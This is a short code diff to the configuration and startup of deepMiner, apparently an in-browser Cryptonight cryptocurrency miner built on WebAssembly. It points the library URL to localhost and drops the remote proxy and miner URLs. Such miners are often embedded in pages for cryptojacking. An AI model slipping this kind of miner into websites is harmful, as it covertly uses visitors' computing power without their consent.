@@ -1,16 +1,13 @@
 self.deepMiner = self.deepMiner || {};
 self.deepMiner.CONFIG = {
-    LIB_URL: "http://%deepMiner_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%deepMiner_domain%/proxy"]],
-    CAPTCHA_URL: "http://%deepMiner_domain%/captcha/",
-    MINER_URL: "http://%deepMiner_domain%/media/miner.html"
+    LIB_URL: "http://localhost/lib/"
 };
 var Module = {
     locateFile: (function (path) {
         return deepMiner.CONFIG.LIB_URL + path
     })
 };
-var Module;
+//var Module;
 if (!Module) Module = (typeof Module !== "undefined" ? Module : null) || {};
 var moduleOverrides = {};
 for (var key in Module) {
@@ -5546,4 +5543,4 @@ CryptonightWASMWrapper.prototype.workThrottled = (function () {
 });
 Module["onRuntimeInitialized"] = (function () {
     var cryptonight = new CryptonightWASMWrapper
-})
+});
